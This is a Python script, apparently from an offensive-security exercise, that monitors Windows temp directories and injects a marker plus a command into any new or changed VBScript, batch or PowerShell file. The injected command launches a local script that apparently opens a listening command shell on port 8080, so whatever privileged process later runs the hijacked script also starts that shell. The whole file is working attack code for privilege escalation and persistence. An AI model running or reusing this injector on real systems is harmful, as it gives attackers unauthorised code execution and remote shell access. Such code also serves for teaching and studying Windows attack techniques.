# Modified example that is originally given here:
# http://timgolden.me.uk/python/win32_how_do_i/watch_directory_for_changes.html
import tempfile
import threading
import win32file
import win32con
import os

# these are the common temp file directories
dirs_to_monitor = ["C:\\WINDOWS\\Temp", tempfile.gettempdir()]

# file modification constants
FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5
ACTIONS = [1, 2, 3, 4, 5]

# extension based code snippets to inject
file_types = {}
command = "python C:\\Windows\\Temp\\bhpnet.py –l –p 8080 –c"

file_types['.vbs'] = ["\r\n'bhpmarker\r\n", f"\r\nCreateObject(\"Wscript.Shell\").Run(\"{command}\")\r\n"]
file_types['.bat'] = ["\r\nREM bhpmarker\r\n", f"\r\n{command}\r\n"]
file_types['.ps1'] = ["\r\n#bhpmarker\r\n", f"Start-Process \"{command}\""]


def inject_code(full_filename, extension, contents):
    # is our marker already in the file?
    if file_types[extension][0] in contents:
        return

    # no marker let's inject the marker and code
    full_contents = file_types[extension][0]
    full_contents += file_types[extension][1]
    full_contents += contents

    fd = open(full_filename, "wb")
    fd.write(full_contents.encode())
    fd.close()

    print("[\\o/] Injected code.")


def start_monitor(path_to_watch):
    # we create a thread for each monitoring run
    file_list_directory = 0x0001

    try:
        h_directory = win32file.CreateFile(
            path_to_watch,
            file_list_directory,
            win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
            None,
            win32con.OPEN_EXISTING,
            win32con.FILE_FLAG_BACKUP_SEMANTICS,
            None)

        print(f"[*] Created directory watcher on {path_to_watch}")

        while True:
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_SIZE |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY,
                None,
                None
            )

            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)

                if action not in ACTIONS:
                    print(f"[???] Unknown action: {action} on {full_filename}")

                elif action == FILE_DELETED:
                    print(f"[ - ] Deleted {full_filename}")

                elif action == FILE_RENAMED_FROM:
                    print(f"[ > ] Renamed from: {full_filename}")

                elif action == FILE_CREATED:
                    print(f"[ + ] Created {full_filename}")
                    prepare_injection(full_filename, False)

                elif action == FILE_MODIFIED:
                    print(f"[ * ] Modified {full_filename}")
                    prepare_injection(full_filename, True)

                elif action == FILE_RENAMED_TO:
                    print(f"[ < ] Renamed to: {full_filename}")
                    prepare_injection(full_filename, True)

    except BaseException as e:
        print(f"[*] Could not create directory watcher on {path_to_watch}, Error: {e}")


def prepare_injection(full_filename, read_contents):

    try:
        contents = None

        if read_contents:
            print("[vvv]")
            fd = open(full_filename, "rb")
            contents = fd.read().decode()
            fd.close()
            print(contents)
            print("[^^^]")

        filename, extension = os.path.splitext(full_filename)

        if extension in file_types:
            inject_code(full_filename, extension, contents)

    except BaseException as e:
        print(f"[!!!] Failed. Error: {e}")


for path in dirs_to_monitor:
    monitor_thread = threading.Thread(target=start_monitor, args=(path, ))
    print(f"[*] Spawning monitoring thread for path: {path}")
    monitor_thread.start()
